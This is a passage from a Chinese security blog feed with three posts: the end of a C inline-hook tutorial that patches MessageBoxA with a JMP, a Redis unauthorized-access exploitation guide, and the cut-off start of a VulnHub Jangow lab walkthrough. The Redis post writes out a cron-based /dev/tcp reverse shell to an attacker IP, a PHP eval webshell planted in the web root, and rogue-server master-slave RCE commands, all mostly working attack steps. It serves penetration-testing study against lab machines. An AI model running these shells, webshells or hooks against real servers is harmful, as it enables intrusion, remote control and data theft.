class="comment">//L是让char*的实参和LPCWSTR的形参兼容</span></span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        push uType</span><br><span class="line">        push lpCaption</span><br><span class="line">        push lpText</span><br><span class="line">        push hwnd</span><br><span class="line">        call Proxy <span class="comment">//调用执行Proxy</span></span><br><span class="line">        mov dwRet, eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwRet;</span><br><span class="line">&#125;</span><br><span class="line">_declspec (naked)</span><br><span class="line">VOID <span class="type">static</span> <span class="title function_">Proxy</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//执行原函数（MessageBoxA）前五字节</span></span><br><span class="line">        _emit <span class="number">0x11</span> <span class="comment">//用emit就是在当前位置直接插入数据相当于db </span></span><br><span class="line">        _emit <span class="number">0x22</span> <span class="comment">//0x99……0x11相当于在内存中先占个坑，后面会被真正要用到的地址给覆盖掉（0xE9除外）</span></span><br><span class="line">        _emit <span class="number">0x33</span></span><br><span class="line">        _emit <span class="number">0x44</span></span><br><span class="line">        _emit <span class="number">0x55</span></span><br><span class="line">        <span class="comment">//跳回原函数地址+5</span></span><br><span class="line">        _emit <span class="number">0xe9</span> <span class="comment">//JMP</span></span><br><span class="line">        _emit <span class="number">0x66</span></span><br><span class="line">        _emit <span class="number">0x77</span></span><br><span class="line">        _emit <span class="number">0x88</span></span><br><span class="line">        _emit <span class="number">0x99</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">VOID <span class="type">static</span> <span class="title function_">FuncEnd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">InlineHook</span><span class="params">(PINLINEHOOK_DATA pInlineHookData)</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwDistance;</span><br><span class="line">    DWORD dwOriginProtect, dwOriginFuncProtect;</span><br><span class="line">    DWORD dwFuncLen;</span><br><span class="line">    PBYTE pData;</span><br><span class="line">    <span class="comment">//计算Proxy在内存占用的空间大小</span></span><br><span class="line">    dwFuncLen = (PBYTE)FuncEnd - (PBYTE)Proxy;</span><br><span class="line">    <span class="comment">//修改内存页的属性为可读可写</span></span><br><span class="line">    VirtualProtect(Proxy, dwFuncLen, PAGE_EXECUTE_READWRITE, &amp;dwOriginProtect);</span><br><span class="line">    VirtualProtect((PVOID)pInlineHookData-&gt;pfFuncAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOriginFuncProtect);<span class="comment">//预修改5字节的call指令</span></span><br><span class="line">    <span class="comment">//查找定位预设为存储原数据的地址</span></span><br><span class="line">    pData = (PBYTE)SearchAddr(Proxy, dwFuncLen, <span class="number">0x44332211</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pData)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        memcpy_s(void* dest,size_t numberOfElements,const void* src,size_t count);</span></span><br><span class="line"><span class="comment">        dest：新的缓冲区；numberOfElements：目标缓冲区的大小；src：要复制的缓冲区；count：字符数，的副本。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//保存原函数函数前5字节到pData,由于jmp的机器码占用1字节，跳转到的地址偏移占用4字节，所以需要保存前5字节</span></span><br><span class="line">    memcpy_s(pData, <span class="number">5</span>, (PVOID)pInlineHookData-&gt;pfFuncAddr, <span class="number">5</span>);</span><br><span class="line">    pData += <span class="number">6</span>;<span class="comment">//5（原函数的前5字节）+1（准备跳回的JMP指令1字节）</span></span><br><span class="line">    dwDistance = (PBYTE)pInlineHookData-&gt;pfFuncAddr + <span class="number">5</span> - ((PBYTE)pData + <span class="number">4</span>);<span class="comment">//MessageBoxA+5的地址</span></span><br><span class="line">    memcpy_s(pData, <span class="number">4</span>, &amp;dwDistance, <span class="number">4</span>);<span class="comment">//保存跳回MessageBoxA+5处所需的偏移地址</span></span><br><span class="line">    VirtualProtect(Proxy, dwFuncLen, dwOriginProtect, &amp;dwOriginProtect);<span class="comment">//内存页权限恢复</span></span><br><span class="line">    <span class="comment">//构造覆盖原函数前5字节jmp+0x**近转移</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     JMP 的 3 种类型</span></span><br><span class="line"><span class="comment">        1. 短跳转（Short Jmp，只能跳转到256字节的范围内），对应机器码：EB</span></span><br><span class="line"><span class="comment">        2. 近跳转（Near Jmp，可跳至同一段范围内的地址），对应机器码：E9</span></span><br><span class="line"><span class="comment">        3. 远跳转（Far Jmp，可跳至任意地址），对应机器码： EA</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pInlineHookData-&gt;byHookCode[<span class="number">0</span>] = <span class="number">0xe9</span>;<span class="comment">//近距离地址跳转的jmp指令，它的机器码为E9</span></span><br><span class="line">    dwDistance = (PBYTE)pInlineHookData-&gt;pfTargetFunc - (PBYTE)pInlineHookData-&gt;pfFuncAddr - <span class="number">5</span>;<span class="comment">//自定义函数的地址，-5是因为MessageBoxA前5字节会被jmp指令和到MyMessageBoxA偏移地址覆盖了（见后面几行）</span></span><br><span class="line">    memcpy_s(pInlineHookData-&gt;byOriginCode, <span class="number">5</span>, (PVOID)pInlineHookData-&gt;pfFuncAddr, <span class="number">5</span>);<span class="comment">//保存MessageBoxA函数前5字节的数据，实际并不会用到，因为前面已经保存到Proxy了，恢复时会调用执行</span></span><br><span class="line">    memcpy_s(pInlineHookData-&gt;byHookCode + <span class="number">1</span>, <span class="number">4</span>, &amp;dwDistance, <span class="number">4</span>);<span class="comment">//注意+1，因为0处存了JMP</span></span><br><span class="line">    memcpy_s((PVOID)pInlineHookData-&gt;pfFuncAddr, <span class="number">5</span>, pInlineHookData-&gt;byHookCode, <span class="number">5</span>);<span class="comment">//将MessageBoxA函数前5字节覆盖为JMP+到MyMessageBoxA的偏移地址</span></span><br><span class="line">    <span class="comment">//内存页权限恢复</span></span><br><span class="line">    VirtualProtect((PVOID)pInlineHookData-&gt;pfFuncAddr, <span class="number">5</span>, dwOriginFuncProtect, &amp;dwOriginFuncProtect);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找定位预设为存储原数据地址的函数</span></span><br><span class="line">PVOID <span class="title function_">SearchAddr</span><span class="params">(PVOID pStart, DWORD dwSize, DWORD dwAddrCodeMark)</span><span class="comment">//找到存有dwAddrCodeMark的地址</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD i = (DWORD)pStart;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; (DWORD)pStart + dwSize; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (IsBadReadPtr((PVOID)i, <span class="number">4</span>) == <span class="number">0</span> &amp;&amp; *((DWORD*)i) == dwAddrCodeMark)<span class="comment">//找到存有dwAddrCodeMark的地址</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> (PVOID)i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="效果测试">6、效果测试</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f8c58368ebf.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f8c5a7f1492.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f8c5c8d067b.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f8c5dd21a79.png" /></p>
<h2 id="总结">3. 总结</h2>
<p>Hook钩子，主要是为了能在执行目标函数或指令之前，拦截数据或者执行逻辑，先执行自己插入的一段代码，然后再执行原本的目标函数。</p>
<p>IAT（Import Address
Table，输入地址表）：当PE文件装入的时候，Windows加载器的工作之一就是定位所有被输入的函数和数据，并且让正在被装入的文件可以使用那些地址，输入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于相关的dll等文件中，当然只有被程序调用到的函数才会出现在IAT中（EAT是PE中所有导出的函数或者变量，注意区别，一般的EXE文件不会有导出表，但并不是说EXE不能导出函数或者变量）。IAT
HOOK就是钩住感兴趣的函数，然后改变程序的执行流程或者对该函数进行监控。</p>
<p>Inline
hook是一种通过修改机器码的方式来实现hook的技术。正常执行的程序：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f8c26beb989.png" /></p>
<p>将call指令替换成jmp指令，jmp到我们自己编写的函数，在函数里call原来的函数，函数结束后再jmp回到原先call指令的下一条指令。如图：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f8c2806f60d.png" /></p>
<p>相对比而言，IAT
Hook工作原理与实现都比较简单,但如果想钩取的API不在目标进程的IAT中，那么就无法使用该技术进行钩取操作。Inline
Hook的实现需要计算涉及的跳转地址，难度较大，不过兼容性更强；另外，IAT
Hook不会恢复原程序的执行，Inline
Hook在执行完我们自己的函数后会恢复原程序的正常执行。</p>
]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>远程控制</tag>
        <tag>Hook</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis 漏洞总结</title>
    <url>/2023/02/03/redis-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="redis介绍"><strong>1. Redis介绍</strong></h2>
<p>Redis是当前最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI
C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库。</p>
<p><strong>特点：</strong></p>
<p>基于内存运行，性能高效；支持分布式，理论上可以无限扩展；key-value存储系统；开源的使用ANSI
C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
<p><strong>数据结构：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6401bce5be314.png" /></p>
<p><strong>常用命令：</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> xz <span class="string">&quot;Hacker&quot;</span> # 设置键xz的值为字符串Hacker，如果键的值中有空格，需要使用双引号括起来，如<span class="string">&quot;Hello World&quot;</span>；Redis是不区分命令的大小写的，set和SET是同一个意思 </span><br><span class="line"><span class="built_in">get</span> xz # 获取键xz的内容，当尝试获取一个不存在的键的值时，Redis会返回空，即(<span class="literal">nil</span>) </span><br><span class="line"><span class="built_in">SET</span> score 857 # 设置键score的值为857 </span><br><span class="line">INCR score # 使用INCR命令将score的值增加1 </span><br><span class="line"><span class="built_in">GET</span> score # 获取键score的内容 </span><br><span class="line">keys * # 列出当前数据库中所有的键 <span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="built_in">set</span> protected-mode <span class="literal">no</span> # 关闭安全模式 </span><br><span class="line"><span class="built_in">get</span> anotherkey # 获取一个不存在的键的值 <span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="built_in">set</span> dir /root/redis # 设置保存目录 <span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="built_in">set</span> dbfilename redis.rdb # 设置保存文件名 <span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="built_in">get</span> dir # 查看保存目录 <span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="built_in">get</span> dbfilename # 查看保存文件名 </span><br><span class="line">save # 进行一次备份操作 </span><br><span class="line">flushall # 删除所有数据 </span><br><span class="line">del key # 删除键为key的数据 </span><br><span class="line">slaveof<span class="built_in"> ip port </span># 设置主从关系 </span><br><span class="line">redis-cli -h<span class="built_in"> ip </span>-p 6379 -a passwd # 外部连接</span><br></pre></td></tr></table></figure>
<p><strong>Redis配置文件参数：</strong></p>
<p>port参数</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">格式为<span class="keyword">port</span>后面接端口号，如<span class="keyword">port</span> 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。</span><br></pre></td></tr></table></figure>
<p>bind参数</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">格式为bind后面接<span class="built_in">IP</span>地址，可以同时绑定在多个<span class="built_in">IP</span>地址上，<span class="built_in">IP</span>地址之间用空格分离，如bind <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> <span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>，表允许<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span>和<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>两个<span class="built_in">IP</span>连接。如果设置为<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>则表示任意<span class="built_in">ip</span>都可连接，说白了就是白名单。</span><br></pre></td></tr></table></figure>
<p>save参数</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">格式为<span class="keyword">save</span> &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个<span class="keyword">save</span>参数，如：</span><br><span class="line"><span class="keyword">save</span> <span class="number">900</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">save</span> <span class="number">300</span> <span class="number">10</span></span><br><span class="line"><span class="keyword">save</span> <span class="number">60</span> <span class="number">10000</span></span><br><span class="line">表示如果数据库的内容在<span class="number">60</span>秒后产生了<span class="number">10000</span>次改变，或者<span class="number">300</span>秒后产生了<span class="number">10</span>次改变，或者<span class="number">900</span>秒后产生了<span class="number">1</span>次改变，那么立即进行备份操作。</span><br></pre></td></tr></table></figure>
<p>requirepass参数</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。</span><br></pre></td></tr></table></figure>
<p>dir参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">格式为<span class="built_in">dir</span>后接指定的路径，默认为<span class="built_in">dir</span> ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。</span><br></pre></td></tr></table></figure>
<p>dbfilename参数</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename <span class="keyword">dump</span>.rdb，即备份文件的名字为<span class="keyword">dump</span>.rdb。</span><br></pre></td></tr></table></figure>
<p>config命令</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">通过<span class="built_in">config</span>命令可以读取和设置<span class="keyword">dir参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command </span><span class="built_in">CONFIG</span> HTCMD，可以将<span class="built_in">CONFIG</span>命令重命名为HTCMD。配置文件默认是没有对<span class="built_in">CONFIG</span>命令进行重命名操作的。</span><br></pre></td></tr></table></figure>
<p>protected-mode参数</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">redis3<span class="number">.2</span>之后添加了protected-mode安全模式，默认值为<span class="literal">yes</span>，开启后禁止外部连接，所以在测试时，先在配置中修改为<span class="literal">no</span>。</span><br></pre></td></tr></table></figure>
<h2 id="环境搭建centos-7-64"><strong>2. 环境搭建（CentOS 7
64）</strong></h2>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装gcc</span></span><br><span class="line">[root<span class="variable">@localhost</span> ~]<span class="comment"># yum install -y gcc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载解压redis安装包</span></span><br><span class="line">[root<span class="variable">@localhost</span> ~]<span class="comment"># wget http://download.redis.io/releases/redis-5.0.0.tar.gz</span></span><br><span class="line">[root<span class="variable">@localhost</span> ~]<span class="comment"># tar xvf redis-5.0.0.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译并执行安装，指定安装目录为/usr/local/redis</span></span><br><span class="line">[root<span class="variable">@localhost</span> ~]<span class="comment"># cd redis-5.0.0/</span></span><br><span class="line">[root<span class="variable">@localhost</span> redis-<span class="number">5.0</span>.<span class="number">0</span>]<span class="comment">#  make &amp;&amp; make install PREFIX=/usr/local/redis</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动redis服务并保持后台运行</span></span><br><span class="line">[root<span class="variable">@localhost</span> redis-<span class="number">5.0</span>.<span class="number">0</span>]<span class="comment">#  cd /usr/local/redis/bin/</span></span><br><span class="line">[root<span class="variable">@localhost</span> bin]<span class="comment"># ./redis-server &amp;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭保护模式</span></span><br><span class="line">[root<span class="variable">@localhost</span> bin]<span class="comment"># ./redis-cli </span></span><br><span class="line"><span class="meta prompt_">127.0.0.1:6379&gt;</span> config set <span class="keyword">protected</span>-mode no</span><br><span class="line"></span><br><span class="line"><span class="comment">#还需要关闭防火墙</span></span><br><span class="line">[root<span class="variable">@localhost</span> bin]<span class="comment"># systemctl stop firewalld.service</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6401c853552da.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6401c85eae97f.png" /></p>
<h2 id="利用计划任务反弹shell"><strong>3.
利用计划任务反弹shell</strong></h2>
<p><strong>条件：</strong></p>
<p>redis对/var/spool/cron有写入权限或Redis以root身份运行
redis无密码或者弱密码</p>
<p><strong>kali用nc开启监听：nc -lvp 4444</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6401e10d096ae.png" /></p>
<p><strong>kali操作Redis命令</strong></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">apt install redis-tools</span><br><span class="line">redis-<span class="keyword">cli</span> -<span class="keyword">h</span> 192.168.159.131 -p 6379</span><br><span class="line">config <span class="keyword">set</span> <span class="keyword">dir</span> /<span class="keyword">var</span>/spool/cron/   # 设置目录为/<span class="keyword">var</span>/spool/cron/</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">test</span> <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.159.129/4444 0&gt;&amp;1\n\n&quot;</span>   #将反弹<span class="keyword">shell</span>写入<span class="keyword">test</span>键</span><br><span class="line">config <span class="keyword">set</span> dbfilename root  # 设置文件名为root</span><br><span class="line"><span class="keyword">save</span> </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6401e76d1ee32.png" /></p>
<p><strong>效果：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6401e753cdce1.png" /></p>
<p><strong>注，</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6401e8163f5a9.png" /></p>
<h2 id="直接写webshell"><strong>4. 直接写webshell</strong></h2>
<p><strong>条件</strong></p>
<p>服务器开着WEB服务且WEB目录路径已知 root启动redis（需要增删改查权限）
redis弱密码或者无密码</p>
<p><strong>CentOS 7安装Apache+php</strong></p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装Apache</span></span><br><span class="line">yum install httpd</span><br><span class="line"><span class="comment">#启动Apache命令</span></span><br><span class="line"><span class="params">system</span>ctl start httpd</span><br><span class="line"><span class="comment">#重启Apache命令</span></span><br><span class="line"><span class="params">system</span>ctl restart httpd</span><br><span class="line"><span class="comment">#停止Apache命令</span></span><br><span class="line"><span class="params">system</span>ctl stop httpd</span><br><span class="line"><span class="comment">#apache测试，安装完若访问不了，关闭防火墙再试</span></span><br><span class="line"><span class="params">system</span>ctl stop firewalld.service</span><br><span class="line"><span class="comment">#安装php环境</span></span><br><span class="line">yum install php</span><br><span class="line"><span class="comment">#php环境测试</span></span><br><span class="line">echo <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> &gt; /<span class="keyword">var</span>/www/html/index.php</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6401f1b0bbfa0.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6401fde4ab2c8.png" /></p>
<p><strong>kali操作Redis命令</strong></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">config set dir /var/www/html/</span></span><br><span class="line"><span class="language-xml">set shell &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;test&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;</span></span><br><span class="line"><span class="language-xml">config set dbfilename webshell.php</span></span><br><span class="line"><span class="language-xml">save</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6401fc81581ae.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6401fddb85c75.png" /></p>
<p>注，如果失败，多试几次</p>
<h2 id="利用主从复制获取shell">5. 利用主从复制获取shell</h2>
<p><strong>原理</strong></p>
<p>Redis主从模式是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力。
在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
<p><strong>条件</strong></p>
<p>Redis
版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）
redis弱密码或者无密码 root启动redis</p>
<p><strong>模拟主从关系，具体命令</strong></p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面# redis-cli -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">33</span>.<span class="number">134</span></span><br><span class="line"><span class="number">192.168.33.134:6379</span>&gt; slaveof <span class="number">192</span>.<span class="number">168</span>.<span class="number">33</span>.<span class="number">131</span> <span class="number">6379</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168.33.134:6379</span>&gt; get xz</span><br><span class="line">(nil)</span><br><span class="line"><span class="number">192.168.33.134:6379</span>&gt; exit</span><br><span class="line">root@kali:~/桌面# redis-cli</span><br><span class="line"><span class="number">127.0.0.1:6379</span>&gt; get xz</span><br><span class="line">(nil)</span><br><span class="line"><span class="number">127.0.0.1:6379</span>&gt; set xz xz</span><br><span class="line">OK</span><br><span class="line"><span class="number">127.0.0.1:6379</span>&gt; exit</span><br><span class="line">root@kali:~/桌面# redis-cli -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">33</span>.<span class="number">134</span></span><br><span class="line"><span class="number">192.168.33.134:6379</span>&gt; get xz</span><br><span class="line"><span class="string">&quot;xz&quot;</span></span><br><span class="line"><span class="number">192.168.33.134:6379</span>&gt;</span><br></pre></td></tr></table></figure>
<p><strong>设置主从关系</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_64020219cda35.png" /></p>
<p><strong>kali下载利用工具</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/n0b0dyCN/redis-rogue-server.git</span><br></pre></td></tr></table></figure>
<p>下载之后cd进入RedisModulesSDK目录使用make编译，也可以用作者给出的默认exp.so测试。
有两种使用方法：一种是交互式shell,另一种是反弹shell
<strong>交互shell演示：</strong></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 redis-rogue-server<span class="selector-class">.py</span> <span class="attr">--rhost</span> <span class="number">192.168</span>.<span class="number">159.131</span> <span class="attr">--lhost</span> <span class="number">192.168</span>.<span class="number">159.129</span> <span class="attr">--exp</span> exp<span class="selector-class">.so</span> </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_64020585ab92b.png" /></p>
<p><strong>反弹shell演示：</strong></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 redis-rogue-server<span class="selector-class">.py</span> <span class="attr">--rhost</span> <span class="number">192.168</span>.<span class="number">159.131</span> <span class="attr">--lhost</span> <span class="number">192.168</span>.<span class="number">159.129</span> <span class="attr">--exp</span> exp<span class="selector-class">.so</span> </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_6402061a0dbb9.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_640206b12f1ae.png" /></p>
<h2 id="ssh公钥远程连接利用"><strong>6.
SSH公钥远程连接利用</strong></h2>
<p>参见: Redis 未授权访问漏洞复现及利用</p>
<p>参考：https://www.freebuf.com/articles/web/249238.html</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>JANGOW: 1.0.1</title>
    <url>/2023/08/24/jangow-1-0-1/</url>
    <content><![CDATA[<blockquote>
<p>靶机介绍及下载：<a
href="https://www.vulnhub.com/entry/jangow-101,754/">Jangow: 1.0.1 ~
VulnHub</a> 注，VM打开靶机检测不到IP解决方法参见：<a
href="https://www.yuque.com/summerdon/cpubfz/ux121k?">Vulnhub靶机检测不到IP</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<ul>
<li>主机探测的方法及工具介绍可以参见：<a
href="https://www.cnblogs.com/z9m8r8/articles/15574388.html">主动信息收集之主机发现
- z9m8r8 - 博客园</a>，以 <code>netdiscover</code> 探测为例：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.226.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%201.jpg" /></p>
<ul>
<li><p>靶机 <code>IP</code>：<code>192.168.159.153</code></p>
<h3 id="端口扫描">1.2. 端口扫描</h3></li>
<li><p>端口扫描的方法和工具介绍可以参见：<a
href="https://www.cnblogs.com/z9m8r8/articles/15615756.html">主动信息收集之端口扫描
- z9m8r8 - 博客园</a>，以 <code>nmap</code> 扫描为例：</p></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.159.153 -p1-65535</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%202.jpg" /></p>
<p>开了21端口，则后面可以尝试远程登录【弱口令】，80的端口进一步进行Web信息收集</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<ul>
<li>访问站点并进行目录遍历</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%204.jpg" /></p>
<p>随便点了点发现个特殊点，<a
href="http://192.168.159.153/site/busque.php?buscar=，尝试赋值看有啥问题没，结果发现存在">http://192.168.159.153/site/busque.php?buscar=，尝试赋值看有啥问题没，结果发现存在</a>
RCE，为此渗透攻击时可以尝试写马或直接反弹shell。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%205.jpg" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.153/&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%203.jpg" /></p>
<p>有个备份文件访问下，得到了数据库信息，用户名和密码等，前面扫描到主机开21，后面可尝试用该用户名和密码登录。
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%206.jpg" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="尝试反弹-shell">2.1. 尝试反弹 shell</h3>
<p>通过 <code>http://192.168.159.153/site/busque.php?buscar=</code>
执行下面命令，没反应，可能做了什么限制，后面再说。 <a
href="https://forum.ywhack.com/shell.php">各种反弹 SHELL
命令在线快捷生成版在线工具</a></p>
